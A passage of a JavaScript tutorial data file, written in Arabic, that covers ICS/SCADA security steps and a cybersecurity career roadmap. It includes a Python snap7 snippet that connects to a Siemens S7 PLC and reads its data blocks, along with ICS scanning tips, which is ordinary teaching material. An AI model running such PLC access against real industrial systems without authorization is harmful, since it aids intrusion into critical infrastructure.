  {title:'Siemens S7 Protocol',text:'بروتوكول S7 لـ PLCs من سيمنز. snap7 للاتصال البرمجي.',cmd:'pip install python-snap7\npython3 << EOF\nimport snap7\nclient = snap7.client.Client()\nclient.connect(\'target\', 0, 1)\ninfo = client.get_cpu_info()\nprint(info.ModuleTypeName)\ndata = client.db_read(1, 0, 10)  # قراءة DB1\nEOF',cmdDesc:'اتصال بـ Siemens S7 PLCs'},
  {title:'Nessus لفحص ICS',text:'Nessus Industrial Security لفحص بيئات ICS/SCADA.',cmd:'# في Nessus:\n# New Scan > Advanced Scan\n# أضف: ICS/SCADA plugins\n# أو بـ OpenVAS:\ngvm-start\n# Settings > Scan Configs > ICS Scan Config',cmdDesc:'فحص ICS/SCADA بـ Nessus'},
  {title:'تقرير ICS Security',text:'تقرير ICS يختلف عن Web pentest - التأثير قد يكون كارثياً.',cmd:'# أقسام تقرير ICS:\n# 1. Risk Assessment (خطورة عالية جداً)\n# 2. Network Segmentation Analysis\n# 3. Protocol Vulnerabilities\n# 4. Device Hardening Recommendations\n# 5. Incident Response Plan\n# المرجع: IEC 62443, NERC CIP',cmdDesc:'كتابة تقرير ICS Security'}
 ]
},
{id:60,title:'مسار احتراف الأمن السيبراني',icon:'🚀',level:'beginner',cat:'basics',
 tags:['Career','Roadmap','Certifications','Jobs'],
 desc:'خارطة طريق كاملة من صفر إلى محترف أمن سيبراني.',
 steps:[
  {title:'المرحلة الأولى - الأساسيات',text:'بناء أساس تقني قوي في Networking وLinux وBrinciples الأمن.',cmd:'# موارد مجانية:\n# - Professor Messer CompTIA A+/Network+\n# - TryHackMe: Pre-Security Path\n# - Cisco NetAcad: IT Essentials\n# اختبر نفسك:\nnmap localhost\nip addr show\nss -tulnp',cmdDesc:'موارد المرحلة الأولى'},
  {title:'المرحلة الثانية - الشهادات المدخل',text:'CompTIA Security+ أو eJPT كأول شهادة عملية.',cmd:'# eJPT (eLearnSecurity Junior Penetration Tester):\n# - سعر معقول (~200 دولار)\n# - عملية 100%\n# CompTIA Security+:\n# - معترف بها دولياً\n# - DOD Approved\n# Google Cybersecurity Certificate على Coursera:\n# - مجاني مع دعم مالي',cmdDesc:'خيارات الشهادات المدخلية'},
  {title:'المرحلة الثالثة - التخصص',text:'اختر مسار: Penetration Testing, Blue Team, Forensics, Cloud Security.',cmd:'# مسارات التخصص:\n# Pentest: OSCP → OSEP → OSED\n# Blue Team: CompTIA CySA+ → GCIH → GCFE\n# Cloud: AWS Security Specialty → CCSP\n# AppSec: GWEB → BSCP\n# Bug Bounty: HackerOne, Bugcrowd, Intigriti',cmdDesc:'اختيار مسار التخصص'},
  {title:'بناء Portfolio عملي',text:'GitHub وHackTheBox writeups وBug Bounty reports أفضل سيرة ذاتية.',cmd:'# أنشئ GitHub:\ngit init my-security-portfolio\n# ضع فيه:\n# - سكريبتات أتمتة\n# - CTF writeups\n# - أدوات مخصصة\n# ابدأ Bug Bounty:\n# HackerOne, Bugcrowd (برامج public)\n# Intigriti (للعرب خصوصاً)',cmdDesc:'بناء Portfolio احترافي'},
  {title:'سوق العمل والرواتب',text:'الأمن السيبراني من أعلى الوظائف التقنية رواتباً.',cmd:'# مستويات الرواتب (تقريبية):\n# Junior (0-2 سنة): 5,000-12,000 SAR/شهر\n# Mid (2-5 سنوات): 12,000-25,000 SAR/شهر\n# Senior (5+ سنوات): 25,000-50,000+ SAR/شهر\n# Bug Bounty: غير محدود!\n# أشهر برامج بالمنطقة:\n# SANS ICS515, SABIC, ARAMCO, NEOM',cmdDesc:'سوق العمل في الأمن السيبراني العربي',note:'CREST المعتمدة في السعودية تفتح أبواباً واسعة.'}
 ]
}
];

// دمج مع الـ TUTORIALS
if (typeof TUTORIALS !== 'undefined') {
  TUTORIALS.push(...TUTORIALS_EXTRA2);
}
